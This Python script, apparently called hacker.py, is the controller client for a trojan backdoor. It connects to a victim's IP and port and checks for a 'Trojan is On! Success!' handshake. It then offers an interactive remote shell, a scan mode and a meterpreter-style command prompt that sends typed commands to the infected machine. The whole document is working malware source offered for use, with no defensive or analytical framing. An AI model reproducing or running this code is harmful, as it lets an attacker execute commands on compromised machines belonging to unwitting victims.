import sys
sys.path.append("./tools/")
from optparse import OptionParser
import socket

def main():
    usage="usage:hacker.py -i <victim ip address> -p <victim port>"
    parser=OptionParser(usage=usage)
    parser.add_option("-i","--ipaddress",type="string",dest="ipaddress",help="the ip_address of the victim!")
    parser.add_option("-p","--port",type="int",dest="port",help="the port of the victim!")
    (options,args)=parser.parse_args()
    ip=options.ipaddress
    port=options.port
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip,port))
    situation=s.recv(1024).decode("utf-8")
    if situation != 'Trojan is On! Success!':
        return 0
    while True:
        data_recv=s.recv(1024).decode("utf-8")
        print(data_recv)
        if data_recv=='Stop success':
            break
        if data_recv =='You can now input the command of shell':
            while True:
                msg2=input("shell<<")
                s.send(msg2.encode("utf-8"))
                result=s.recv(1024).decode("utf-8")
                if result=='Bye_shell':
                    break
                print(result)
        if data_recv=='scan_now':
            while True:
                results=s.recv(1024).decode("utf-8")
                print(results)
                if results=='Finished!':
                    break
        msg=input("meterpreter<< ")
        s.send(msg.encode("utf-8"))
    s.close()

if __name__ == '__main__':
    main()



